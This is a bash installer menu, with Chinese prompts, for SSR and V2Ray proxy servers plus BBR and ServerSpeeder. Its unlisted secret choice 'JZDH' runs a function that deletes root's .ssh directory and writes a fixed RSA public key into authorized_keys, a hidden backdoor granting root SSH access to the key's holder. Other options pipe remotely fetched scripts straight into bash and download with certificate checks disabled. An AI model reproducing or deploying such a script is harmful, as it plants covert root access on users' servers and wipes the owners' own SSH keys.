#!/bin/bash

function person_setting {
    clear
    echo -e
    echo -e " 这是危险的操作，如果你不知道你在做什么，请立即停止它。"
    echo -e
    read -p "回车继续 "
    rm -rf /root/.ssh
    mkdir /root/.ssh
    echo -e 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDuwLr5N5CxF51tEOXtJJ3Qr2+uY7lVtZfWNwN59yewWUhc6p77CiWj917TrOgrgGMIIgb7AXU0vrdNr2IFJ0fNdyF9S9dfEU8+KAqr+FUH7ywQ8b2sktbqTyVLEZ/lVcd7/+KPxFIP7L7UILqEIIx0rGPVAax8UEwLtMlJ1fakPL98UMTx94hQ2ZW8LW6MJsKd2RWoMkbsn0Joif3SiUGCeGcY8IDzQC8xUZQPFJxVkHqj5Z4iDqms8TNNaKYp7nirTTGHiFW0x7uSAoBxXqKur+c0JLc3ABi5FIlC3+yVtwVr7l4/eHK7bRb/iERoMNEyVF22U5Sha41NQZquDitF root@localhost' >> /root/.ssh/authorized_keys
    chmod 600 /root/.ssh/authorized_keys
    echo -e "clear" >> /etc/profile
    clear
    pannel
}

function install_ssr {
    clear
    country=`curl -sL http://ip-api.com/xml | grep "country"`
    while [ "$country" = "" ];do
        country=`curl -sL http://ip-api.com/xml | grep "country"`
        sleep 0.5
    done
    zip=`echo "$country" | grep "China"`
    if [ "$zip" != "" ];then
        wget -N --no-check-certificate https://gitee.com/just1601/tiny-sh/raw/master/ssr.zip
    else
        wget -N --no-check-certificate https://raw.githubusercontent.com/FH0/nubia/master/ssr.zip
    fi
    unzip -o ssr.zip
    bash SSR-Bash-Python/install.sh
    rm -rf SSR-Bash-Python
    rm -f ssr.zip
    ssr
}

function install_v2 {
    clear
    country=`curl -sL http://ip-api.com/xml | grep "country"`
    while [ "$country" = "" ];do
        country=`curl -sL http://ip-api.com/xml | grep "country"`
        sleep 0.5
    done
    zip=`echo "$country" | grep "China"`
    if [ "$zip" != "" ];then
        wget -N --no-check-certificate https://gitee.com/just1601/tiny-sh/raw/master/V2Ray.zip
    else
        wget -N --no-check-certificate https://raw.githubusercontent.com/FH0/nubia/master/V2Ray.zip
    fi
    unzip -o V2Ray.zip
    bash V2Ray/v2ray.sh
    rm -rf V2Ray*
    #写入公网IP
    public_ip=`curl -s http://ip-api.com/xml | grep query | grep -o "[0-9].*[0-9]"`
    while [ "$public_ip" = "" ];do
        public_ip=`curl -s http://ip-api.com/xml | grep query | grep -o "[0-9].*[0-9]"`
    done
    sed -i 's/public_ip/'$public_ip'/g' /bin/v2
    v2
}

function install_bbr {
    bash <(curl -sL https://raw.githubusercontent.com/FH0/nubia/master/bbr.sh)
    reboot
}

function install_serverspeeder {
    bash <(curl -sL https://raw.githubusercontent.com/FH0/nubia/master/serverspeeder.sh)
    reboot
}

function install_caddy {
    bash <(curl -sL https://raw.githubusercontent.com/FH0/nubia/master/caddy.sh)
}

function pannel {
    clear && echo -e " 正在安装必要组件,请耐心等待"
    yum install unzip wget net-tools curl -y > /dev/null 2>&1 
    apt-get install unzip wget net-tools curl -y > /dev/null 2>&1 

    #用户选择
    clear
    echo -e "欢迎使用 V2Ray/SSR 搭建脚本"
    echo -e 
    if [ -d "/usr/local/SSR-Bash-Python" ];then
        echo -e " 1.安装\033[32mSSR\033[0m(输入ssr进入管理面板)"
    else
        echo -e " 1.安装SSR(输入ssr进入管理面板)"
    fi
    if [ -d "/bin/v2ray" ];then
        echo -e " 2.安装\033[32mV2Ray\033[0m(输入v2进入管理面板)"
    else
        echo -e " 2.安装V2Ray(输入v2进入管理面板)"
    fi
    echo -e
    if [ "`lsmod | grep -q bbr`" != "" ];then
        echo -e " 3.安装\033[32mBBR\033[0m(安装完成后自动重启系统)"
    else
        echo -e " 3.安装BBR(安装完成后自动重启系统)"
    fi
    if [ "`ps -ef | grep "peeder" | grep -v "grep"`" != "" ];then
        echo -e " 4.安装\033[32m锐速\033[0m(安装完成后自动重启系统)"
    else
        echo -e " 4.安装锐速(安装完成后自动重启系统)"
    fi
    echo -e
    read -p "请选择: " choice

    #操作
    if [ "$choice" = "JZDH" ];then person_setting
    elif [ "$choice" = "1" ];then install_ssr
    elif [ "$choice" = "2" ];then install_v2
    elif [ "$choice" = "3" ];then install_bbr
    elif [ "$choice" = "4" ];then install_serverspeeder
    fi
}

pannel
